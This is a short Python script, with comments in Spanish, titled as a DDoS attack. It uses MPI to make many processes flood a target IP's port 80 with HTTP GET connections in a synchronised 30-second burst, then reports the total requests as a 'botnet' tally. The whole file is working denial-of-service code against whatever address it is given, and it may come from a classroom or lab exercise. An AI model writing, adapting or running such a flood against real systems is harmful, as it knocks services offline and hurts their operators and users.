# ddos_attack.py
from mpi4py import MPI
import socket
import sys
import time

comm = MPI.COMM_WORLD
rank = comm.Get_rank()
size = comm.Get_size()

if len(sys.argv) < 2:
    if rank == 0:
        print("Uso: mpiexec.mpich ... python3 ddos_attack.py <IP_VÍCTIMA>")
    sys.exit(1)

target_ip = sys.argv[1]
target_port = 80
# Petición HTTP GET básica
request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n\r\n".encode()

if rank == 0:
    print(f"🔥 [Maestro] Iniciando ataque coordinado. {size} procesos apuntando a {target_ip}:{target_port}...")

# Sincronización absoluta: Todos atacan en el mismo instante
comm.Barrier()
start_time = time.time()
req_count = 0

# Bucle de ataque rápido usando sockets
try:
    while time.time() - start_time < 30: # Ataque de 30 segundos
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((target_ip, target_port))
            s.sendall(request)
            req_count += 1
        except Exception:
            pass # Si Nginx no responde o bloquea, seguimos intentando
        finally:
            s.close()
except KeyboardInterrupt:
    pass

# Recolectar estadísticas
total_requests = comm.gather(req_count, root=0)

if rank == 0:
    print("\n--- 📊 INFORME DE LA BOTNET MPI ---")
    print(f"Peticiones totales enviadas a {target_ip}: {sum(total_requests)}")